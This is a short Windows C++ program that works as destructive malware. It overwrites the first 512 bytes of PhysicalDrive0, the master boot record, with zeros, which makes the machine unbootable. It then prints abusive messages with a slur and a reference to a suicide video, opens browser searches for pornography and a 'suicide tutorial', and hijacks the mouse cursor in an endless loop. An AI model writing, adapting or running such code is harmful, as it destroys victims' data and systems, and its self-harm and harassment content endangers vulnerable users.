
#include <iostream>
#include <windows.h>
#include <time.h>

using namespace std;

int main() {
    int X, Y;
    char mbrData[512];

    ZeroMemory(&mbrData, (sizeof mbrData));

    HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0",
                            GENERIC_ALL,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            NULL,
                            OPEN_EXISTING,
                            NULL,
                            NULL
                            );

    DWORD write;
    WriteFile(MBR, mbrData, 512, &write, NULL);
    cout << "GG - Modables. You lose, I win.\nUnless you plan on keeping your PC on for an entire stone age." << endl;
    cout << "Lets be honest here, you deserve it, You whore!\nronnie mcnutt suicide video on google" << endl;

    system("start explorer.exe https://www.google.com/search?client=firefox-b-1-d&q=gay+porn");
    system("start explorer.exe https://www.google.com/search?client=firefox-b-1-d&q=suicide+tutorial+because+im+tired+of+this+fucking+life");

    srand(time(NULL));
    while(1) {
        X = rand() % 801;
        Y = rand() % 601;
        SetCursorPos(X, Y);
    }

    CloseHandle(MBR);

    return 0;
}
